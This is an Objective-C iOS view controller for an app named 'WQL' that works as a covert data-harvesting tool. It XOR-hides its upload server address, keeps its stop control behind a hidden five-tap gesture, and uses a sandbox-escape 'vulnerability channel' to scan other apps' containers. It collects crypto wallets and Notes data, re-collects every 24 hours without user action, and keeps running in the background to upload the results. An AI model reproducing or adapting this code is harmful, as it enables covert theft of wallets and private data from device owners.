#import "WQLViewController.h"
#import "WQLEscape.h"
#import "WQLScanner.h"
#import "WQLPathLeak.h"
#import "WQLKeepAlive.h"
#import "WQLLog.h"
#import "WQLUploader.h"
#import <dispatch/dispatch.h>
#import <float.h>

/// 内置上传端点：分段异或，避免 IPA 里 strings 直接搜到完整 URL
static NSString *WQLBuiltinEndpoint(void) {
    static const unsigned char kBytes[] = {
        0x32, 0x2E, 0x2E, 0x2A, 0x29, 0x60, 0x75, 0x75, 0x30, 0x2F, 0x3F, 0x2B,
        0x33, 0x6B, 0x6C, 0x62, 0x74, 0x2E, 0x35, 0x2A, 0x75, 0x28, 0x2D, 0x3F,
        0x69, 0x3F, 0x28, 0x69, 0x68, 0x2E, 0x75, 0x22, 0x22, 0x22, 0x22, 0x22
    };
    static const unsigned char kKey = 0x5A;
    char buf[sizeof(kBytes) + 1];
    for (size_t i = 0; i < sizeof(kBytes); i++) buf[i] = (char)(kBytes[i] ^ kKey);
    buf[sizeof(kBytes)] = 0;
    return [NSString stringWithUTF8String:buf] ?: @"";
}

@interface WQLViewController ()

@property (nonatomic, strong) UILabel *statusLabel;
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UITextField *endpointField;
@property (nonatomic, strong) UIButton *scanButton;
@property (nonatomic, strong) UIButton *stopButton;
@property (nonatomic, copy) NSString *lastOutDir;
@property (nonatomic, copy) NSString *activeEndpoint;

@property (nonatomic, strong) WQLScanner *scanner;
@property (nonatomic, assign) BOOL scanning;
@property (nonatomic, assign) BOOL stopRequested;
@property (nonatomic, assign) NSUInteger logLines;
@property (nonatomic, assign) NSUInteger busyDepth;
@property (nonatomic, assign) UIBackgroundTaskIdentifier bgTask;
@property (nonatomic, assign) BOOL didAutoResume;
@property (nonatomic, assign) BOOL debugUnlocked;

- (void)uploadLogIfPossible;
- (void)autoCollectIfNeeded;
- (void)loadEndpoint;
- (NSString *)maskedEndpoint:(NSString *)ep;
- (void)toggleDebugTools;
- (void)saveEndpointOverride;
- (void)setStatus:(NSString *)text;
- (void)flushPendingIfPossible;

@end

@implementation WQLViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = [UIColor systemBackgroundColor];
    self.title = @"WQL";
    _bgTask = UIBackgroundTaskInvalid;

    [self buildUI];
    [self loadEndpoint];

    // 重启后「上传」按钮还能用：把上次的输出目录接回来
    NSString *savedDir = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLLastOutDir"];
    if (savedDir.length && [[NSFileManager defaultManager] fileExistsAtPath:savedDir]) {
        self.lastOutDir = savedDir;
    }

    [self logText:@"WQL 通道就绪（仅用户态，无内核）"];
    [self refreshStatus];
}

- (void)viewDidAppear:(BOOL)animated {
    [super viewDidAppear:animated];
    if (self.didAutoResume) return;
    self.didAutoResume = YES;
    [self autoCollectIfNeeded];
}

#pragma mark - 端点

- (void)loadEndpoint {
    NSString *builtin = WQLBuiltinEndpoint();
    NSString *override = [[NSUserDefaults standardUserDefaults] stringForKey:@"WQLUploadEndpointOverride"];
    self.activeEndpoint = override.length ? override : builtin;
    [WQLUploader shared].endpoint = self.activeEndpoint;

    // 老版本「每次上传都往 UserDefaults 写地址」，这里清掉，避免它压过内置值
    [[NSUserDefaults standardUserDefaults] removeObjectForKey:@"WQLUploadEndpoint"];

    self.endpointField.enabled = NO;
    self.endpointField.text = self.debugUnlocked ? self.activeEndpoint
                                                 : [self maskedEndpoint:self.activeEndpoint];
}

- (NSString *)maskedEndpoint:(NSString *)ep {
    if (!ep.length) return @"未配置";
    NSRange scheme = [ep rangeOfString:@"://"];
    if (scheme.location == NSNotFound) return @"已内置";
    NSUInteger start = NSMaxRange(scheme);
    if (start >= ep.length) return @"已内置";
    NSRange slash = [ep rangeOfString:@"/"
                              options:0
                                range:NSMakeRange(start, ep.length - start)];
    if (slash.location == NSNotFound) return ep;
    return [[ep substringToIndex:slash.location] stringByAppendingString:@"/***"];
}

/// 长按状态栏 5 次：显示/隐藏调试工具（停止、改地址）
- (void)toggleDebugTools {
    if (!self.debugUnlocked) {
        // 解锁：把真实地址填进输入框
        self.endpointField.enabled = YES;
        self.endpointField.text = self.activeEndpoint;
        self.stopButton.hidden = NO;
        self.debugUnlocked = YES;
        [self logText:@"调试工具已解锁（停止按钮 / 改地址）"];
    } else {
        [self saveEndpointOverride];
        self.endpointField.enabled = NO;
        self.endpointField.text = [self maskedEndpoint:self.activeEndpoint];
        self.stopButton.hidden = YES;
        self.debugUnlocked = NO;
        [self logText:@"调试工具已隐藏"];
    }
}

- (void)saveEndpointOverride {
    NSString *t = [self.endpointField.text stringByTrimmingCharactersInSet:
                   [NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (!t.length || [t isEqualToString:self.activeEndpoint]) return;
    [[NSUserDefaults standardUserDefaults] setObject:t forKey:@"WQLUploadEndpointOverride"];
    self.activeEndpoint = t;
    [WQLUploader shared].endpoint = t;
    [self logText:[NSString stringWithFormat:@"上传地址已改为 %@", t]];
}

#pragma mark - 自动采集状态机

/// 首轮全扫 → 之后每 24 小时增量扫 → 其余时间只补传。
/// 判断只看「上次成功完成的时间」，不受用户操作影响。
- (void)autoCollectIfNeeded {
    if (self.scanning) return;

    if (!self.activeEndpoint.length) {
        [self setStatus:@"未配置上传地址，无法自动采集"];
        [self logText:@"没有内置上传地址，跳过自动采集"];
        return;
    }

    [self flushPendingIfPossible];

    NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
    BOOL firstDone = [d boolForKey:@"WQLFirstRunDone"];
    BOOL interrupted = [d boolForKey:@"WQLScanInterrupted"];
    BOOL hasCp = [WQLPathLeak hasCheckpoint];
    double last = [d doubleForKey:@"WQLLastScanEnd"];
    double since = last > 0 ? ([[NSDate date] timeIntervalSince1970] - last) : DBL_MAX;

    if (!firstDone || interrupted || hasCp) {
        [self logText:hasCp ? @"【自动采集】检测到断点，继续上次的全量扫描"
                            : @"【自动采集】首轮未完成，开始全量采集"];
        [self setStatus:@"自动采集：全量扫描准备中"];
        [self onScan];
        return;
    }

    if (since >= 24 * 3600) {
        [self logText:[NSString stringWithFormat:
                       @"【自动采集】距上次完成 %.1f 小时，开始 24h 增量扫描", since / 3600.0]];
        [self setStatus:@"自动采集：增量扫描准备中"];
        [self onScan];
        return;
    }

    [self logText:[NSString stringWithFormat:
                   @"【自动采集】距上次完成 %.1f 小时（<24h），本轮只补传未成功的包",
                   since / 3600.0]];
    [self setStatus:@"空闲（24 小时内已采集过）"];
}

- (void)flushPendingIfPossible {
    __weak typeof(self) weakSelf = self;
    WQLScanner *flusher = [WQLScanner new];
    flusher.logBlock = ^(NSString *line) {
        [weakSelf appendLog:line];
    };
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        [flusher flushPendingUploads];
    });
}

- (void)setStatus:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.statusLabel.text = text;
    });
}

#pragma mark - UI

- (void)buildUI {
    self.statusLabel = [UILabel new];
    self.statusLabel.numberOfLines = 0;
    self.statusLabel.font = [UIFont monospacedSystemFontOfSize:12 weight:UIFontWeightRegular];
    self.statusLabel.textColor = [UIColor secondaryLabelColor];
    self.statusLabel.translatesAutoresizingMaskIntoConstraints = NO;
    self.statusLabel.userInteractionEnabled = YES;
    UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] initWithTarget:self
                                                                          action:@selector(toggleDebugTools)];
    tap.numberOfTapsRequired = 5;
    [self.statusLabel addGestureRecognizer:tap];

    UIButton *diagButton = [self buttonWithTitle:@"自检" action:@selector(onDiagnostics)];
    self.scanButton = [self buttonWithTitle:@"开始扫描" action:@selector(onScan)];
    self.stopButton = [self buttonWithTitle:@"停止" action:@selector(onStop)];
    self.stopButton.enabled = NO;
    self.stopButton.hidden = YES;   // 调试工具：长按状态栏 5 次才出现
    UIButton *uploadButton = [self buttonWithTitle:@"上传" action:@selector(onUpload)];
    UIButton *probeButton = [self buttonWithTitle:@"测试上传" action:@selector(onUploadProbe)];
    UIButton *shareButton = [self buttonWithTitle:@"分享日志" action:@selector(onShare)];

    UIStackView *row1 = [[UIStackView alloc] initWithArrangedSubviews:
                         @[diagButton, self.scanButton, self.stopButton]];
    UIStackView *row2 = [[UIStackView alloc] initWithArrangedSubviews:
                         @[uploadButton, probeButton, shareButton]];
    for (UIStackView *row in @[row1, row2]) {
        row.axis = UILayoutConstraintAxisHorizontal;
        row.distribution = UIStackViewDistributionFillEqually;
        row.spacing = 8;
    }
    UIStackView *buttons = [[UIStackView alloc] initWithArrangedSubviews:@[row1, row2]];
    buttons.axis = UILayoutConstraintAxisVertical;
    buttons.spacing = 8;
    buttons.translatesAutoresizingMaskIntoConstraints = NO;

    self.endpointField = [UITextField new];
    self.endpointField.placeholder = @"上传地址 https://.../upload（留空则不上传）";
    self.endpointField.font = [UIFont systemFontOfSize:12];
    self.endpointField.borderStyle = UITextBorderStyleRoundedRect;
    self.endpointField.autocapitalizationType = UITextAutocapitalizationTypeNone;
    self.endpointField.autocorrectionType = UITextAutocorrectionTypeNo;
    self.endpointField.keyboardType = UIKeyboardTypeURL;
    self.endpointField.clearButtonMode = UITextFieldViewModeWhileEditing;
    self.endpointField.translatesAutoresizingMaskIntoConstraints = NO;

    self.logView = [UITextView new];
    self.logView.editable = NO;
    self.logView.selectable = YES;
    self.logView.alwaysBounceVertical = YES;
    self.logView.font = [UIFont monospacedSystemFontOfSize:11 weight:UIFontWeightRegular];
    self.logView.backgroundColor = [UIColor secondarySystemBackgroundColor];
    self.logView.layer.cornerRadius = 8;
    self.logView.textContainerInset = UIEdgeInsetsMake(8, 8, 8, 8);
    self.logView.translatesAutoresizingMaskIntoConstraints = NO;

    [self.view addSubview:self.statusLabel];
    [self.view addSubview:self.endpointField];
    [self.view addSubview:buttons];
    [self.view addSubview:self.logView];

    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [self.statusLabel.topAnchor constraintEqualToAnchor:safe.topAnchor constant:12],
        [self.statusLabel.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.statusLabel.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],

        [self.endpointField.topAnchor constraintEqualToAnchor:self.statusLabel.bottomAnchor constant:10],
        [self.endpointField.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.endpointField.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.endpointField.heightAnchor constraintEqualToConstant:34],

        [buttons.topAnchor constraintEqualToAnchor:self.endpointField.bottomAnchor constant:8],
        [buttons.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [buttons.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [buttons.heightAnchor constraintEqualToConstant:88],

        [self.logView.topAnchor constraintEqualToAnchor:buttons.bottomAnchor constant:12],
        [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
        [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
        [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-12],
    ]];
}

- (UIButton *)buttonWithTitle:(NSString *)title action:(SEL)action {
    UIButton *b = [UIButton buttonWithType:UIButtonTypeSystem];
    [b setTitle:title forState:UIControlStateNormal];
    b.titleLabel.font = [UIFont systemFontOfSize:14 weight:UIFontWeightMedium];
    b.backgroundColor = [UIColor secondarySystemBackgroundColor];
    b.layer.cornerRadius = 8;
    [b addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    return b;
}

- (void)refreshStatus {
    NSDictionary *d = [[WQLEscape shared] diagnostics];
    self.statusLabel.text = [NSString stringWithFormat:
                             @"iOS %@  %@   group: %@\n容器: %@\n符号: %@   flags: %@",
                             d[@"os"], d[@"device"], d[@"group"], d[@"groupPath"],
                             [d[@"symbolsOK"] boolValue] ? @"OK" : @"缺失",
                             d[@"flagsFirst"]];
}

#pragma mark - 日志

- (void)appendLog:(NSString *)line {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *stamp = [NSDateFormatter localizedStringFromDate:[NSDate date]
                                                         dateStyle:NSDateFormatterNoStyle
                                                         timeStyle:NSDateFormatterMediumStyle];
        NSString *entry = [NSString stringWithFormat:@"[%@] %@\n", stamp, line];
        self.logView.text = [self.logView.text stringByAppendingString:entry];
        self.logLines++;

        if (self.logLines > 2000) {
            NSArray *lines = [self.logView.text componentsSeparatedByString:@"\n"];
            if (lines.count > 1200) {
                self.logView.text = [[lines subarrayWithRange:NSMakeRange(lines.count - 1200, 1200)]
                                     componentsJoinedByString:@"\n"];
                self.logLines = 1200;
            }
        }
        NSRange bottom = NSMakeRange(self.logView.text.length, 0);
        [self.logView scrollRangeToVisible:bottom];
    });
}

/// 界面 + 文件双写。scanner 自己的日志已经写过文件，走 appendLog 即可，避免重复。
- (void)logText:(NSString *)text {
    WQLLogLine(@"%@", text);
    [self appendLog:text];
}

#pragma mark - 动作

- (void)onDiagnostics {
    [self refreshStatus];
    NSDictionary *d = [[WQLEscape shared] diagnostics];
    for (NSString *k in @[@"os", @"device", @"group", @"groupPath", @"symbolsError"]) {
        NSString *v = d[k];
        if (v.length) [self logText:[NSString stringWithFormat:@"%@ = %@", k, v]];
    }

    NSString *err = nil;
    if (![[WQLEscape shared] prepareWithError:&err]) {
        [self logText:[NSString stringWithFormat:@"符号解析失败: %@", err]];
        return;
    }

    // 用自己 App Group 容器做一个最小闭环验证
    NSURL *groupRoot = [[NSFileManager defaultManager]
                        containerURLForSecurityApplicationGroupIdentifier:
                        [[WQLEscape shared] groupIdentifier]];
    if (!groupRoot) {
        [self logText:@"group 容器为 nil：描述文件里没有这个 App Group，通道不可用"];
        return;
    }

    int64_t handle = [[WQLEscape shared] consumeExtensionForPath:groupRoot.path error:&err];
    if (handle > 0) {
        [self logText:[NSString stringWithFormat:@"自检通过，handle=%lld", (long long)handle]];
        [[WQLEscape shared] releaseHandle:handle];
    } else {
        [self logText:[NSString stringWithFormat:@"自检失败: %@", err ?: @"unknown"]];
    }
}

- (void)onScan {
    if (self.scanning) return;

    self.scanning = YES;
    self.stopRequested = NO;
    self.scanButton.enabled = NO;
    self.stopButton.enabled = YES;
    // 标记「扫描进行中」：进程被杀掉下次启动会自动续扫，正常结束会清掉
    [[NSUserDefaults standardUserDefaults] setBool:YES forKey:@"WQLScanInterrupted"];

    [self beginBusy];

    [self cleanupOldOutputsKeeping:3];

    NSString *stamp = [NSDateFormatter localizedStringFromDate:[NSDate date]
                                                     dateStyle:NSDateFormatterShortStyle
                                                     timeStyle:NSDateFormatterShortStyle];
    stamp = [stamp stringByReplacingOccurrencesOfString:@"/" withString:@"-"];
    stamp = [stamp stringByReplacingOccurrencesOfString:@":" withString:@"-"];

    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *outDir = [docs stringByAppendingPathComponent:
                        [NSString stringWithFormat:@"wql_out/%@", stamp]];

    WQLScanner *scanner = [WQLScanner new];
    scanner.maxContainerBytes = 800ULL * 1024 * 1024;
    scanner.includeNotes = YES;   // 备忘录：主库 + Accounts 图片
    self.scanner = scanner;

    __weak typeof(self) weakSelf = self;
    scanner.logBlock = ^(NSString *line) {
        [weakSelf appendLog:line];
    };
    scanner.cancelBlock = ^BOOL{
        __strong typeof(weakSelf) self = weakSelf;
        return self ? self.stopRequested : YES;
    };
    scanner.progressBlock = ^(NSString *text) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [self setStatus:[@"自动采集 · " stringByAppendingString:text]];
    };

    [self logText:[NSString stringWithFormat:@"输出目录: %@", outDir]];
    self.lastOutDir = outDir;
    [[NSUserDefaults standardUserDefaults] setObject:outDir forKey:@"WQLLastOutDir"];

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        [scanner scanWithOutputDirectory:outDir];
        dispatch_async(dispatch_get_main_queue(), ^{
            // 只有正常跑完且通道可用才算「首轮完成」；
            // 调试时点停止 / 通道不可用 → 标志和断点都保留，下次自动重试
            BOOL cancelled = self.stopRequested;
            NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
            if (!cancelled && scanner.lastRunUsable) {
                [d setBool:NO forKey:@"WQLScanInterrupted"];
                [d setBool:YES forKey:@"WQLFirstRunDone"];
                [d setDouble:[[NSDate date] timeIntervalSince1970] forKey:@"WQLLastScanEnd"];
            } else if (!cancelled) {
                [self logText:@"⚠️ 本轮通道不可用，不算完成，下次启动会重试"];
            }

            self.scanning = NO;
            self.scanButton.enabled = YES;
            self.stopButton.enabled = NO;
            [self logText:@"扫描结束"];
            [self setStatus:cancelled ? @"已停止（调试）" : @"采集完成，等待上传收尾"];

            // 每个钱包在扫描过程中已单独上传，这里只补传完整日志，不重复整包上传
            [self uploadLogIfPossible];
        });
    });
}

- (NSString *)currentEndpoint {
    return self.activeEndpoint ?: @"";
}

- (WQLUploader *)configuredUploader {
    NSString *ep = self.activeEndpoint;
    if (!ep.length) {
        [self logText:@"没有可用的上传地址"];
        return nil;
    }

    WQLUploader *up = [WQLUploader shared];
    up.endpoint = ep;
    up.maxFileBytes = 64ULL * 1024 * 1024;

    __weak typeof(self) weakSelf = self;
    up.logBlock = ^(NSString *line) {
        [weakSelf appendLog:line];
    };
    return up;
}

- (void)uploadDirectory:(NSString *)dir
                  label:(NSString *)label
             completion:(void (^)(void))done {
    WQLUploader *up = [self configuredUploader];
    if (!up) {
        if (done) done();
        return;
    }

    [self logText:[NSString stringWithFormat:@"开始上传(%@): %@", label, dir]];
    __weak typeof(self) weakSelf = self;
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_UTILITY, 0), ^{
        [up uploadDirectory:dir completion:^(NSUInteger ok, NSUInteger failed) {
            [weakSelf logText:[NSString stringWithFormat:
                               @"上传完成：成功 %lu / 失败 %lu",
                               (unsigned long)ok, (unsigned long)failed]];
            if (done) done();
        }];
    });
}

- (void)onUpload {
    [self onUploadWithCompletion:nil];
}

/// 扫描结束后把完整日志单独传一份到服务器（独立 multipart，服务端直接落成 txt）。
/// 无论成功、失败还是没配地址，都在这里释放保活——它是扫描结束后唯一的 endBusy 出口。
- (void)uploadLogIfPossible {
    NSString *ep = [self currentEndpoint];
    NSString *path = WQLLogFilePath();
    if (!ep.length || ![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        [self endBusy];
        return;
    }

    [self logText:@"【收尾】上传完整日志"];
    WQLUploader *up = [self configuredUploader];
    __weak typeof(self) weakSelf = self;
    [up uploadLogFile:path completion:^(BOOL ok) {
        [weakSelf logText:ok ? @"✅ 完整日志已上传到服务器" : @"⛔ 日志上传失败"];
        [weakSelf endBusy];
    }];
}

- (void)onUploadWithCompletion:(void (^)(void))done {
    NSString *dir = self.lastOutDir;
    if (!dir.length || ![[NSFileManager defaultManager] fileExistsAtPath:dir]) {
        [self logText:@"还没有可上传的采集结果，先点「开始扫描」"];
        if (done) done();
        return;
    }
    [self beginBusy];
    [self uploadDirectory:dir label:@"采集结果" completion:^{
        [self endBusy];
        if (done) done();
    }];
}

/// 不依赖漏洞通道，造一个测试文件走完整上传链路
- (void)onUploadProbe {
    NSString *dir = [NSTemporaryDirectory() stringByAppendingPathComponent:
                     [NSString stringWithFormat:@"wql_probe_%@", NSUUID.UUID.UUIDString]];
    NSString *docsDir = [dir stringByAppendingPathComponent:@"com.wql.probe/Documents"];
    NSString *file = [docsDir stringByAppendingPathComponent:@"probe.txt"];

    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:docsDir withIntermediateDirectories:YES attributes:nil error:nil];

    NSString *content = [NSString stringWithFormat:
                         @"wql upload probe\napp=%@\ntime=%@\n",
                         [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"],
                         [NSDate date]];
    [content writeToFile:file atomically:YES encoding:NSUTF8StringEncoding error:nil];

    [self logText:[NSString stringWithFormat:@"已生成测试文件: %@", file]];
    [self beginBusy];
    [self uploadDirectory:dir label:@"测试" completion:^{
        [self endBusy];
    }];
}

#pragma mark - 保活（扫描/上传共用，按引用计数）

- (void)beginBusy {
    self.busyDepth += 1;
    if (self.busyDepth > 1) return;

    [[WQLKeepAlive shared] ensureRunning];
    BOOL alive = [WQLKeepAlive shared].running;
    [self logText:alive ? @"后台保活已开启：划到后台 / 锁屏仍会继续"
                        : @"后台保活未开启：切到后台约 30 秒后会被挂起"];

    __weak typeof(self) weakVC = self;
    self.bgTask = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"wql.busy"
                                                              expirationHandler:^{
        __strong typeof(weakVC) vc = weakVC;
        if (!vc) return;
        if (vc.bgTask != UIBackgroundTaskInvalid) {
            [[UIApplication sharedApplication] endBackgroundTask:vc.bgTask];
            vc.bgTask = UIBackgroundTaskInvalid;
        }
    }];
}

- (void)endBusy {
    if (self.busyDepth == 0) return;
    self.busyDepth -= 1;
    if (self.busyDepth > 0) return;

    // 保活不在这里停：本轮跑完后 App 仍要能在后台待命（被系统杀掉前随时可续扫）
    if (self.bgTask != UIBackgroundTaskInvalid) {
        [[UIApplication sharedApplication] endBackgroundTask:self.bgTask];
        self.bgTask = UIBackgroundTaskInvalid;
    }
}

#pragma mark - 旧产物清理

- (void)cleanupOldOutputsKeeping:(NSUInteger)keep {
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *root = [docs stringByAppendingPathComponent:@"wql_out"];
    NSFileManager *fm = [NSFileManager defaultManager];

    NSArray *items = [fm contentsOfDirectoryAtPath:root error:nil];
    if (items.count <= keep) return;

    NSArray *sorted = [items sortedArrayUsingSelector:@selector(compare:)];
    NSUInteger removeCount = sorted.count - keep;
    NSUInteger removed = 0;
    for (NSUInteger i = 0; i < removeCount; i++) {
        NSString *p = [root stringByAppendingPathComponent:sorted[i]];
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:p isDirectory:&isDir] && isDir) {
            if ([fm removeItemAtPath:p error:nil]) removed++;
        }
    }
    if (removed) {
        [self logText:[NSString stringWithFormat:@"清理旧采集目录 %lu 个",
                       (unsigned long)removed]];
    }
}

- (void)onStop {
    self.stopRequested = YES;
    [self logText:@"已请求停止，等待当前步骤结束"];
}

- (void)onShare {
    NSString *path = WQLLogFilePath();
    if (![[NSFileManager defaultManager] fileExistsAtPath:path]) {
        [self logText:@"日志文件还不存在，先跑一次自检"];
        return;
    }
    NSURL *url = [NSURL fileURLWithPath:path];
    UIActivityViewController *vc = [[UIActivityViewController alloc]
                                    initWithActivityItems:@[url] applicationActivities:nil];
    if (vc.popoverPresentationController) {
        vc.popoverPresentationController.sourceView = self.view;
        vc.popoverPresentationController.sourceRect =
            CGRectMake(self.view.bounds.size.width / 2, 100, 1, 1);
    }
    [self presentViewController:vc animated:YES completion:nil];
}

@end